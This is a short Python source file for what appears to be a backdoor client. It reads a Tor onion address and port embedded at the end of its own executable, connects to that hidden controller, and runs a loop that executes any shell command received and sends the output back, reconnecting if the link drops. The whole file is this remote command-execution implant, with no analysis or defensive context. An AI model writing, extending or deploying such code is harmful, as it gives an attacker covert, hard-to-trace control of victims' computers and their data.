from network import ClientSocket, Tor
import tasks 
import sys
import os
def read_address_from_binary():
    path = os.path.abspath(sys.executable)
    with open(path, 'rb') as f:
        data = f.read()
        onion = data[-67:-5].decode()
        port = int(data[-5:].decode())
    print(onion + str(port))
    return onion, port
class Client:
    BUFFER_SIZE = 8102
    def __init__(self):
        self.__tor = Tor()
        self.__sock = None
        self.initialize_network()
    def initialize_network(self):
        onion, port = read_address_from_binary()
        self.__sock = ClientSocket(onion, port)
        self.run()
    def run(self):
        while True:
            try:
                task,args = self.__sock.receive(self.BUFFER_SIZE)
                execution_status = self.execute(task, args)
            except Exception as err:
                print(err)
                del self.__sock
                break
            if execution_status == -2:
                continue
        self.initialize_network()
    def execute(self, task, args) -> int:
        if task == 'EXECUTE':
            command = args[0]
            output = tasks.execute_shell(command)
            self.__sock.send(output)
        elif task == 'ACTIVE':
            self.__sock.send('ACTIVE')
        elif task == '':
            self.__sock.send('')
        elif task == 'EXIT':
            return 0
        else:
            self.__sock.send('Unknown command')
        return 0
if __name__ == '__main__':
    client = Client()
        